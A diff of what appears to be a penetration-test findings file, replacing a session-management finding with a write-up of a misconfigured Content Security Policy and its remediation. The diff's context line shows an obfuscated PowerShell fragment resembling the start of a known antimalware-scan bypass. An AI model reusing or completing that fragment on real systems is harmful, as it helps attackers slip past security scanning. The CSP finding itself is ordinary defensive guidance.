@@ -36,10 +36,16 @@ S`eT-It`em('V'+'aR'+'IA'+('blE:1'+'q2')+('uZ'+'x'))([TYpE]("{1}{0}"-F'F','rE'));
 
 =============================================================
 
-Remediation: Implement session management controls to restrict concurrent logins. Notify users if multiple logins are detected and provide an option to terminate all other sessions. Additionally, implement multi-factor authentication (MFA) to enhance security.
+### Misconfigured CSP
 
-Reference:
+**Description**: The Content Security Policy (CSP) is misconfigured, with only `frame-ancestors 'self'` set, while critical directives like `object-src` and `script-src` are missing. This incomplete configuration leaves the application vulnerable to various attacks, such as cross-site scripting (XSS) and plugin-based attacks.
 
-OWASP Session Management
-One-liner recommendation: "It is recommended to restrict concurrent logins and implement session management controls."
+**Impact**: Without `script-src`, the application is exposed to the risk of executing malicious scripts, leading to XSS attacks. The absence of `object-src` means potentially dangerous plugins and embedded content can be loaded, increasing the risk of malicious code execution and data breaches.
 
+**Remediation**: Update the CSP to include comprehensive directives. Set `script-src 'self'` to restrict script sources and `object-src 'none'` to block all plugin content. Regularly review and update the CSP to address new threats and vulnerabilities.
+
+**Reference**:
+- [OWASP Content Security Policy](https://owasp.org/www-project-secure-headers/#content-security-policy)
+- [Mozilla Developer Network - CSP](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)
+
+**One-liner recommendation**: "It is recommended to fully configure CSP by setting `script-src` and `object-src` directives to enhance security."
